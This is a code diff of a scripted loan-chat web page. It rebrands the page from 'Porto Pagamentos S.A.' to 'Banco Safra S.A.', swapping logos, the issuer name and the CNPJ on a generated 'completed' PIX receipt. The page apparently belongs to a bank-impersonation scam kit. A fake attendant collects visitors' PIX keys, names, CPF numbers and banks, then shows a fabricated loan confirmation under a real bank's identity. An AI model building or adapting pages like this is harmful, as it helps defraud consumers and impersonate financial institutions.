@@ -99,7 +99,7 @@
 
     .chat-messages {
       flex: 1; overflow-y: auto; overflow-x: hidden; padding: 14px;
-      background: #e5ddd5 url("images/fundozap2.jpg") center/cover;
+      background: #e5ddd5 url("images/fundozap2.jpg?v=safra2") center/cover;
       display: flex; flex-direction: column; gap: 12px;
       -webkit-overflow-scrolling: touch; overscroll-behavior: contain;
     }
@@ -502,7 +502,7 @@
             <path stroke-linecap="round" stroke-linejoin="round" d="M4 6h16M4 12h16M4 18h16"></path>
           </svg>
         </div>
-        <img src="../images/logo.png" alt="Porto" class="header-logo">
+        <img src="../images/logo.png?v=safra2" alt="Safra" class="header-logo">
       </div>
       <div class="header-right">
         <div class="user-info">
@@ -524,7 +524,7 @@
         <div class="chat-header-back" onclick="history.back()">
           <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path></svg>
         </div>
-        <img src="../images/atendente.png" alt="Fabiola Gonzalez" class="attendant-avatar">
+        <img src="../images/atendente.png?v=safra2" alt="Fabiola Gonzalez" class="attendant-avatar">
         <div class="attendant-info"><h3>Fabiola Gonzalez</h3><p><span style="display:inline-block;width:8px;height:8px;background:#25d366;border-radius:50%;margin-right:4px;vertical-align:middle;"></span>online</p></div>
       </div>
       <div class="chat-messages" id="chatMessages"></div>
@@ -558,7 +558,7 @@
       { text: 'Última pergunta! Quando pretende começar a pagar as parcelas?', options: ['Em 30 dias', 'Em 60 dias', 'Em 90 dias'] }
     ];
 
-    const bancosData = ['Banco do Brasil', 'Bradesco', 'Caixa Econômica Federal', 'Itaú Unibanco', 'Santander', 'Nubank', 'Inter', 'C6 Bank', 'Neon', 'Next', 'PagBank', 'Mercado Pago', 'BTG Pactual', 'Safra', 'Sicoob', 'Sicredi', 'Banco Original', 'Banco Pan', 'Porto', 'Daycoval', 'Banrisul', 'BRB', 'Banestes', 'Banco da Amazônia', 'Banco do Nordeste', 'BNDES', 'Agibank', 'Banco Votorantim', 'Sofisa', 'BS2'];
+    const bancosData = ['Banco do Brasil', 'Bradesco', 'Caixa Econômica Federal', 'Itaú Unibanco', 'Santander', 'Nubank', 'Inter', 'C6 Bank', 'Neon', 'Next', 'PagBank', 'Mercado Pago', 'BTG Pactual', 'Safra', 'Sicoob', 'Sicredi', 'Banco Original', 'Banco Pan', 'Daycoval', 'Banrisul', 'BRB', 'Banestes', 'Banco da Amazônia', 'Banco do Nordeste', 'BNDES', 'Agibank', 'Banco Votorantim', 'Sofisa', 'BS2'];
 
     let selectedPixType = '', pixKey = '', bankName = '', selectedLoanAmount = 0, selectedInstallments = 0, selectedMonthlyPayment = 0;
 
@@ -639,7 +639,7 @@
       if (isUser) {
         m.innerHTML = `<div class="user-avatar"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"/></svg></div><div class="message-bubble"><div class="message-name">${userName}</div><div class="message-text">${text}</div><div class="message-time">${new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' })}</div></div>`;
       } else {
-        m.innerHTML = `<img src="../images/atendente.png" class="message-avatar"><div class="message-bubble"><div class="message-text">${text}</div><div class="message-time">${new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' })}</div></div>`;
+        m.innerHTML = `<img src="../images/atendente.png?v=safra2" class="message-avatar"><div class="message-bubble"><div class="message-text">${text}</div><div class="message-time">${new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' })}</div></div>`;
       }
       chatMessages.appendChild(m);
       if (showOptions && questions[currentQuestion]) {
@@ -662,7 +662,7 @@
       const t = document.createElement('div');
       t.className = 'message attendant';
       t.id = 'typing';
-      t.innerHTML = `<img src="../images/atendente.png" class="message-avatar"><div class="message-bubble"><div class="typing-indicator"><div class="typing-dot"></div><div class="typing-dot"></div><div class="typing-dot"></div></div></div>`;
+      t.innerHTML = `<img src="../images/atendente.png?v=safra2" class="message-avatar"><div class="message-bubble"><div class="typing-indicator"><div class="typing-dot"></div><div class="typing-dot"></div><div class="typing-dot"></div></div></div>`;
       chatMessages.appendChild(t);
       scrollToBottom();
     }
@@ -1146,7 +1146,7 @@
       r.innerHTML = `
         <div class="pix-receipt">
           <div class="receipt-header">
-            <div style="margin:0 auto 12px;text-align:center"><img src="../images/logo.png" alt="Porto" style="height:42px;width:auto;"></div>
+            <div style="margin:0 auto 12px;text-align:center"><img src="../images/logo.png?v=safra2" alt="Safra" style="height:42px;width:auto;"></div>
             <div class="receipt-title">Comprovante de Solicitação via PIX</div>
             <span class="receipt-status"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg> Concluído</span>
           </div>
@@ -1154,14 +1154,14 @@
             <div class="receipt-amount-label">Valor</div>
             <div class="receipt-amount-value">${selectedLoanAmount.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' })}</div>
           </div>
-          <div class="receipt-row"><span class="receipt-label">De</span><span class="receipt-value">Porto Pagamentos S.A.<br>CNPJ 18.236.120/0001-58</span></div>
+          <div class="receipt-row"><span class="receipt-label">De</span><span class="receipt-value">Banco Safra S.A.<br>CNPJ 58.160.789/0001-28</span></div>
           <div class="receipt-row"><span class="receipt-label">Para</span><span class="receipt-value">${rn}<br>CPF ${rc}</span></div>
           <div class="receipt-row"><span class="receipt-label">Chave PIX</span><span class="receipt-value">${pixKey}</span></div>
           <div class="receipt-row"><span class="receipt-label">Banco Destino</span><span class="receipt-value">${bankName}</span></div>
           <div class="receipt-row"><span class="receipt-label">Parcelas</span><span class="receipt-value">${selectedInstallments}x de ${selectedMonthlyPayment.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' })}</span></div>
           <div class="receipt-row"><span class="receipt-label">Data/Hora</span><span class="receipt-value">${ds} ${ts}</span></div>
           <div class="receipt-row"><span class="receipt-label">ID Transação</span><span class="receipt-value">${tid}</span></div>
-          <div class="receipt-footer">Transação Agendada via PIX<br>Porto Pagamentos S.A.</div>
+          <div class="receipt-footer">Transação Agendada via PIX<br>Banco Safra S.A.</div>
         </div>`;
       chatMessages.appendChild(r);
       scrollToBottom();
